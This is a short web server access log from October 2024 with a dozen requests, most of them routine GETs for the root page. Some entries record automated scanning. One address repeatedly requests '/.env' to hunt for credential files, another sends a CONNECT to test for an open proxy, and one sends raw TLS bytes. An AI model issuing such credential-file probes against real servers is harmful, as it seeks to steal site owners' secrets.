34.209.40.123 - - [01/Oct/2024:20:56:50 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
34.209.40.123 - - [01/Oct/2024:20:56:50 +0900] "GET / HTTP/1.1" 200 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
154.212.141.234 - - [01/Oct/2024:21:05:42 +0900] "GET / HTTP/1.1" 404 2308 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
185.224.128.47 - - [01/Oct/2024:21:36:48 +0900] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
103.186.101.138 - - [01/Oct/2024:21:50:25 +0900] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
185.180.140.107 - - [01/Oct/2024:22:23:59 +0900] "GET / HTTP/1.1" 404 1061 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.77.184.45 - - [01/Oct/2024:22:27:01 +0900] "GET / HTTP/1.1" 404 1061 "-" "python-requests/2.32.3"
135.125.217.54 - - [01/Oct/2024:22:32:02 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [01/Oct/2024:22:32:02 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.128.205 - - [01/Oct/2024:22:47:07 +0900] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03@\x93\xDE\x15\x1E\xC1\x93\x18n\xB1\xFE\x97\xC6\x80J)\xDE\x1F\x9E\x0C|E\xE8<\xAA`T\xE6g2\xAE\xE2 \xD8\xD4{\x81\xF3\xB8\x17vi8\xF7\x022\x0E&fN\x06O7\xDB\xCF\x82z\xC5g\xC0\x19\xE1\xB8@<\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
135.125.217.54 - - [01/Oct/2024:23:57:34 +0900] "GET /.env HTTP/1.1" 404 1071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [01/Oct/2024:23:57:34 +0900] "POST / HTTP/1.1" 404 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
